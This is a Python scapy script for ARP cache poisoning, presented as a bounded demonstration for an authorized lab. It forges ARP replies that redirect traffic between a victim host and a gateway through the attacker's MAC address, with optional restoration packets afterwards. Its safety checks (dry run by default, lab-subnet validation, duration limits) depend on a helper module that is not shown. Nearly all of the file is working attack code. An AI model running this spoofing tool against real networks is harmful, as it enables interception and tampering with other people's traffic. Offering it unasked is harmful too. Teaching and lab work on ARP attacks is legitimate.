#!/usr/bin/env python3
"""Short, controlled ARP cache poisoning demonstration for an authorized lab."""

import argparse

from scapy.all import ARP, Ether, get_if_hwaddr, sendp  # type: ignore

from common import (
    abort, add_lab_arguments, log, require_capture_privileges, run_plan,
    validate_common, validate_lab_ip, validate_mac,
)


def make_attack_packets(victim_ip, victim_mac, gateway_ip, gateway_mac, attacker_mac):
    """Claim the gateway IP to the victim and the victim IP to the gateway."""
    to_victim = Ether(src=attacker_mac, dst=victim_mac) / ARP(
        op=2, hwsrc=attacker_mac, psrc=gateway_ip, hwdst=victim_mac, pdst=victim_ip
    )
    to_gateway = Ether(src=attacker_mac, dst=gateway_mac) / ARP(
        op=2, hwsrc=attacker_mac, psrc=victim_ip, hwdst=gateway_mac, pdst=gateway_ip
    )
    return to_victim, to_gateway


def make_restoration_packets(victim_ip, victim_mac, gateway_ip, gateway_mac):
    """Re-advertise the legitimate victim and gateway mappings after the demonstration."""
    to_victim = Ether(src=gateway_mac, dst=victim_mac) / ARP(
        op=2, hwsrc=gateway_mac, psrc=gateway_ip, hwdst=victim_mac, pdst=victim_ip
    )
    to_gateway = Ether(src=victim_mac, dst=gateway_mac) / ARP(
        op=2, hwsrc=victim_mac, psrc=victim_ip, hwdst=gateway_mac, pdst=gateway_ip
    )
    return to_victim, to_gateway


def main() -> None:
    parser = argparse.ArgumentParser(description="Bounded ARP spoofing demonstration for an isolated private LAN.")
    add_lab_arguments(parser)
    parser.add_argument("--victim-ip", required=True)
    parser.add_argument("--victim-mac", required=True)
    parser.add_argument("--gateway-ip", required=True)
    parser.add_argument("--gateway-mac", required=True)
    parser.add_argument("--attacker-mac", help="Sender MAC to advertise; defaults to the specified interface MAC.")
    parser.add_argument("--restore", action="store_true", help="Send legitimate ARP replies after stopping.")
    args = parser.parse_args()

    try:
        network = validate_common(args)
        args.victim_ip = validate_lab_ip(args.victim_ip, network, "victim IP")
        args.gateway_ip = validate_lab_ip(args.gateway_ip, network, "gateway IP")
        if args.victim_ip == args.gateway_ip:
            raise ValueError("victim and gateway must be different hosts.")
        args.victim_mac = validate_mac(args.victim_mac, "victim MAC")
        args.gateway_mac = validate_mac(args.gateway_mac, "gateway MAC")
        args.attacker_mac = validate_mac(args.attacker_mac or get_if_hwaddr(args.interface), "attacker MAC")
        if len({args.victim_mac, args.gateway_mac, args.attacker_mac}) != 3:
            raise ValueError("victim, gateway, and attacker MAC addresses must be different.")
    except ValueError as exc:
        abort(str(exc))

    log("ARP demonstration: the attacker temporarily advertises itself for each peer's IP mapping.")
    log(f"Lab: {network}; interface: {args.interface}; victim: {args.victim_ip}; gateway: {args.gateway_ip}")
    log(f"Plan: {args.count} paired advertisements at {args.interval:.2f}s intervals (maximum {args.max_duration:.2f}s).")
    if not args.send:
        log("Dry run complete. Add --send only after confirming these are lab addresses.")
        return
    try:
        require_capture_privileges()
    except PermissionError as exc:
        abort(str(exc))

    attack_to_victim, attack_to_gateway = make_attack_packets(
        args.victim_ip, args.victim_mac, args.gateway_ip, args.gateway_mac, args.attacker_mac
    )
    sent, elapsed, _ = run_plan(
        lambda: (sendp(attack_to_victim, iface=args.interface, verbose=False),
                 sendp(attack_to_gateway, iface=args.interface, verbose=False)),
        count=args.count, interval=args.interval, max_duration=args.max_duration,
    )
    log(f"Stopped after {sent} paired rounds ({sent * 2} ARP replies) in {elapsed:.2f}s.")
    if args.restore:
        restore_to_victim, restore_to_gateway = make_restoration_packets(
            args.victim_ip, args.victim_mac, args.gateway_ip, args.gateway_mac
        )
        for _ in range(3):
            sendp(restore_to_victim, iface=args.interface, verbose=False)
            sendp(restore_to_gateway, iface=args.interface, verbose=False)
        log("Restoration sent: three legitimate ARP reply pairs.")


if __name__ == "__main__":
    main()
